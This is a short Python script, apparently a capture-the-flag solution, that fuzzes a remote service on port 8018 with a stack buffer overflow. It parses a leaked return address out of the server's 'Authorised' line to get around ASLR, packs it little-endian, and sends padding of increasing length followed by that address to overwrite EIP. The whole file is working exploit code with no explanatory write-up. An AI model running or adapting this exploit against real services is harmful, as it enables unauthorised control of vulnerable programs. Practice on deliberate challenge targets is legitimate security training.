import socket
#bufferoverflow fuzzer - getting hex address from server output message to overwrite EIP, hex address is changing each try because of ASLR

for i in range(10,30):
    #socket creation and definition
    host = "E02-target.allyourbases.co" # example target
    port =  8018                
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    #at first we are receiving some massage from server
    data = s.recv(1024)
    print('Received', repr(data))
    f1bytes = bytes()

    for line in data.decode("utf-8").split("\n"):#server is sending multiple lines and only one contains needed hex address for EIP overwriting
        if "Authorised" in line:  # the line containing "Authorised" contains hex address needed for eip overwriting
            xxx = bytes.fromhex(line.split("0x")[1].replace(".","")) #parsing out the hex address starting with "0x" and ending with "." from line 
            f1 = int.from_bytes(xxx, byteorder='big',signed=False)
            f1bytes = f1.to_bytes(4, byteorder='little', signed=False) 

    data = s.recv(1024)
    print('Received', repr(data))

    bytes_overflow = b"A"*i
    bytes_overflow +=f1bytes                                 
    bytes_overflow += b'\x0a'                                                           

    s.sendall(bytes_overflow)
    data = s.recv(1024)
    print('Received', repr(data))
    #print('Received', data.decode("utf-8").replace("\n",""))
    s.close()
